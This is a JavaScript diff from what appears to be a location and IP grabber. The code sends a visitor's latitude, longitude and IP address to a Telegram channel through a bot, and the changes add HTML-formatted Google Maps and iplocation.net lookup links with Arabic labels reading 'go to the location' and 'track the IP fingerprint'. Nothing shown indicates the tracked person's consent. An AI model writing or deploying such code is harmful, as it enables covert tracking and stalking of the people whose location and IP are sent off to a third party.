@@ -31,9 +31,15 @@
 
 
  // Create the message with the clickable link to Google Maps
+ 
+   
     const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-    const clickableLink = `<a href="${locationLink}">Click here</a>`;
-    const htmlMessage = `${message}\n\nClick the link to view the location: ${clickableLink}`;
+    const clickableLink = `<a href="${locationLink}">اذهب الى الموقع</a>`;
+	const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
+    const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
+
+
+    const htmlMessage = `${message}\n\n ${clickableLink}\n${ipLocationNetLink}`;
 
 
     // Send location and IP results to Telegram bots using an HTTP request
@@ -61,6 +67,12 @@
     const ipAddress = data.ip;
 
     const message = `الايبي:\n ${ipAddress}`;
+	
+	 // Create the message with clickable link
+    const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
+    const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
+  const htmlMessage = `${message}\n\n${ipLocationNetLink}`;
+
 
     // Send IP result to Telegram bots using an HTTP request
     await fetch(telegramBotURL, {
@@ -70,7 +82,8 @@
       },
       body: JSON.stringify({
       chat_id: '@localipy', // Replace with the channel username or ID
-        text: message,
+       text: htmlMessage,
+        parse_mode: 'HTML',
       }),
     });
   }
